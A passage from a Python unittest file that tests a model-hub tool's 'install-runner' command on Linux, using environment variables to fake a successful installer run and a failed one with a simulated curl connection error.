                "MODELHUB_FAKE_INSTALL_OK": "1",
            },
            "install-runner",
        )
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        self.assertTrue(obj["installed"])
        self.assertEqual(obj["os"], "linux")
        self.assertIn("install.sh", obj["cmdline"])
        # the installer output streamed to stderr as progress JSON-lines
        prog = [json.loads(ln) for ln in stderr.splitlines() if ln.strip().startswith("{")]
        self.assertTrue(prog, msg="expected install progress JSON-lines on stderr")
        self.assertTrue(any(p.get("verb") == "install-runner" for p in prog))

    def test_linux_installer_failure_is_actionable(self) -> None:
        obj, _stderr, code = run_verb_env(
            {
                "MODELHUB_FORCE_OS": "linux",
                "MODELHUB_FORCE_NO_OLLAMA": "1",
                "MODELHUB_FAKE_INSTALL_LINES": "curl: (7) Failed to connect",
                "MODELHUB_FAKE_INSTALL_CODE": "7",
            },
            "install-runner",
        )
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertEqual(obj["os"], "linux")
        self.assertIn("install", obj)


if __name__ == "__main__":
    unittest.main(verbosity=2)
